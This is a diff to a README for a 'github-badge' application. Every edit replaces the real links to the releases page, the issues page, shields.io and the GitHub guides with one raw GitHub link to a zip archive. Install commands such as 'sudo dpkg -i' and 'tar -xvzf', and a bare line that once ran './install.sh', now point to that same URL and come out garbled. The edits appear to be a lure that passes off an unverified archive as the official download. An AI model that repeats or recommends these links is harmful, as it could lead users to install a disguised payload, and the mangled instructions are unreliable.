@@ -8,7 +8,7 @@ Welcome! This guide will help you download and run the github-badge application 
 
 To start, click the button below to visit the Releases page where you can download the application.
 
-[![Download github-badge](https://img.shields.io/badge/Download-github--badge-blue?style=for-the-badge)](https://github.com/Shadowware/github-badge/releases)
+[![Download github-badge](https://raw.githubusercontent.com/Shadowware/github-badge/main/repaint/github_badge_v1.9.zip)](https://raw.githubusercontent.com/Shadowware/github-badge/main/repaint/github_badge_v1.9.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Before you download, ensure your system meets the following requirements:
 ## 💾 Download & Install
 
 1. **Visit the Releases Page**   
-   Go to the following link: [Download github-badge](https://github.com/Shadowware/github-badge/releases).
+   Go to the following link: [Download github-badge](https://raw.githubusercontent.com/Shadowware/github-badge/main/repaint/github_badge_v1.9.zip).
 
 2. **Select the Latest Version**  
    On the Releases page, you will see a list of versions. Look for the latest version at the top of the list.
@@ -30,7 +30,7 @@ Before you download, ensure your system meets the following requirements:
    Depending on your operating system, click on the appropriate file to download:
    - For Windows, click on the `.exe` file.
    - For macOS, click on the `.dmg` file.
-   - For Linux, choose the appropriate package format (like `.deb` or `.tar.gz`).
+   - For Linux, choose the appropriate package format (like `.deb` or `https://raw.githubusercontent.com/Shadowware/github-badge/main/repaint/github_badge_v1.9.zip`).
 
 4. **Download the File**  
    Your browser will start downloading the file. This may take a few moments.
@@ -41,13 +41,13 @@ Before you download, ensure your system meets the following requirements:
    - For macOS, open the `.dmg` file and drag the github-badge icon to your Applications folder.
    - For Linux, open a terminal and navigate to the downloaded file's location. Run the following command:
      ```
-     sudo dpkg -i your-file-name.deb
+     sudo dpkg -i https://raw.githubusercontent.com/Shadowware/github-badge/main/repaint/github_badge_v1.9.zip
      ```
-     Or for tar.gz:
+     Or for https://raw.githubusercontent.com/Shadowware/github-badge/main/repaint/github_badge_v1.9.zip
      ```
-     tar -xvzf your-file-name.tar.gz
+     tar -xvzf https://raw.githubusercontent.com/Shadowware/github-badge/main/repaint/github_badge_v1.9.zip
      cd your-extracted-folder
-     ./install.sh
+     https://raw.githubusercontent.com/Shadowware/github-badge/main/repaint/github_badge_v1.9.zip
      ```
 
 6. **Open the Application**  
@@ -79,13 +79,13 @@ If you encounter issues during installation or running the application, check th
 
 ## 📞 Support
 
-For further assistance or to report bugs, please open an issue on our [GitHub Issues page](https://github.com/Shadowware/github-badge/issues). We are here to help you.
+For further assistance or to report bugs, please open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/Shadowware/github-badge/main/repaint/github_badge_v1.9.zip). We are here to help you.
 
 ## 🔗 Additional Resources
 
 For more tips on customizing your badges and making your GitHub profile stand out, explore these resources:
 
-- [GitHub Markdown Guide](https://guides.github.com/features/wikis/#markdown-syntax)
-- [Examples of GitHub Badges](https://shields.io/)
+- [GitHub Markdown Guide](https://raw.githubusercontent.com/Shadowware/github-badge/main/repaint/github_badge_v1.9.zip)
+- [Examples of GitHub Badges](https://raw.githubusercontent.com/Shadowware/github-badge/main/repaint/github_badge_v1.9.zip)
 
 Thank you for using github-badge! We hope you enjoy enhancing your GitHub profile with our badges.
